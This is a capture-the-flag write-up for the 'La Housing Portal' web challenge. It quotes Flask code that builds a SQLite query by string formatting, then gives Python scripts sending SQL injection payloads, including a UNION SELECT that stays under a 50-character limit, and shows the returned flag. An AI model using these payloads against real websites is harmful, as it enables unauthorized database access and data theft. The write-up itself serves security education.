# La Housing Portal

## Description
```
Portal Tips Double Dashes ("--") Please do not use double dashes in any text boxes you complete or emails you send through the portal. 
The portal will generate an error when it encounters an attempt to insert double dashes into the database that stores information from the portal.

Also, apologies for the very basic styling. Our unpaid LA Housing(tm) RA who we voluntold to do the website that we gave FREE HOUSING for decided to quit - we've charged them a fee for leaving, but we are stuck with this website. Sorry about that.

Please note, we do not condone any actual attacking of websites without permission, even if they explicitly state on their website that their systems are vulnerable.
```

## Provided Files
`serv.zip`

## Writeup

Starting off I took a look at the provided files. <br/>
```py
@app.route("/submit", methods=["POST"])
def search_roommates():
    data = request.form.copy()

    if len(data) > 6:
        return "Invalid form data", 422
    
    for k, v in list(data.items()):
        if v == 'na':
            data.pop(k)
        if (len(k) > 10 or len(v) > 50) and k != "name":
            return "Invalid form data", 422
        if "--" in k or "--" in v or "/*" in k or "/*" in v:
            return render_template("hacker.html")
        
    name = data.pop("name")
    
    roommates = get_matching_roommates(data)
    return render_template("results.html", users = roommates, name=name)

def get_matching_roommates(prefs: dict[str, str]):
    if len(prefs) == 0:
        return []
    query = """
    select * from users where {} LIMIT 25;
    """.format(
        " AND ".join(["{} = '{}'".format(k, v) for k, v in prefs.items()])
    )
    print(query)
    conn = sqlite3.connect('file:data.sqlite?mode=ro', uri=True)
    cursor = conn.cursor()
    cursor.execute(query)
    r = cursor.fetchall()
    cursor.close()
    return r
```

Seeing the missing `input sanitation` for the `SQL query` I instantly thought of an `SQL injection`. <br/>
Taking a look into the `data.sql` file I also found the point where the flag was injected. <br/>
```sql
CREATE TABLE IF NOT EXISTS "users"
(
    id       integer not null
        constraint users_pk
            primary key autoincrement,
    name     TEXT,
    guests   TEXT,
    neatness text,
    sleep    TEXT    not null,
    awake    text
);
INSERT INTO users VALUES(1,'Finn Carson','No guests at all','Put things away as we use them','8-10pm','4-6am');
INSERT INTO users VALUES(2,'Aldo Young','No guests at all','Put things away as we use them','8-10pm','6-8pm');
INSERT INTO users VALUES(3,'Joy Holt','No guests at all','Put things away as we use them','8-10pm','8-10am');

------------------------------

CREATE TABLE flag (
flag text
);
INSERT INTO flag VALUES("lactf{fake_flag}");
```

Seeing that the `flag` was in another `SQL table` I instantly knew that it had to be a `SQL UNION query injection`. <br/>
To test out the `SQL injection` I made a little python script which proved to me that it was possible. <br/>
```py
import requests

base_URL = "https://la-housing.chall.lac.tf/submit"

forms = {
    'name': "Idk",
    'guests': "l' or '1'='1",
    'neatness': "na",
    'sleep': "na",
    'awake': "na"
}

req = requests.post(base_URL, data=forms)

print(req.text)
```

It's also important to remember that the payload has the maximum size of 50 characters as seen in the code below. <br/>
```py
if (len(k) > 10 or len(v) > 50) and k != "name":
    return "Invalid form data", 422
```

Knowing these things I made another payload and executed my script. <br/>
```py
import requests

base_URL = "https://la-housing.chall.lac.tf/submit"

forms = {
    'name': "Idk",
    'guests': "idk", 
    'neatness': "l'union select '', '', '', '', '', flag from flag'", 
    'sleep': "na",
    'awake': "na"
}

req = requests.post(base_URL, data=forms)

print(req.text)
```

I had to add whitespaces because the union query only works if it had the same amount of columns as the base table `users`. <br/>
Executing the python script I successfully obtained the flag which concludes this writeup. <br/>
```html
<h2>Result for Idk:</h2>
<table id="data" class="table table-striped">
  <thead>
    <tr>
      <th>Name</th>
      <th>Guests</th>
      <th>Neatness</th>
      <th>Sleep time</th>
      <th>Awake time</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td></td>
      <td></td>
      <td></td>
      <td></td>
      <td>lactf{us3_s4n1t1z3d_1npu7!!!}</td>
    </tr>

  </tbody>
</table>
<a href="/">Back</a>

<style>
  * {
    border: 1px solid black; border-collapse: collapse;
  }
</style>
```